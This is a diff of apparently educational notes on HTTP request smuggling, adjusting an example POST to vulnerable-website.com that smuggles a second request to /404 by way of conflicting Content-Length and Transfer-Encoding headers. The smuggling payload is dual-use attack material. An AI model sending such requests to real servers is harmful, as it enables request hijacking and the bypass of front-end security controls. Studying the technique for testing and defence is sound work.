@@ -44,17 +44,18 @@ The next request should answer with a 404.
 POST /search HTTP/1.1
 Host: vulnerable-website.com
 Content-Type: application/x-www-form-urlencoded
-Content-Length: 4
+Content-length: 4
 Transfer-Encoding: chunked
 
-7c
-GET /404 HTTP/1.1
-Host: vulnerable-website.com
+5e
+POST /404 HTTP/1.1
 Content-Type: application/x-www-form-urlencoded
-Content-Length: 144
+Content-Length: 15
 
-x=
+x=1
 0
+
+
 ```
 
 The next request should answer with a 404.
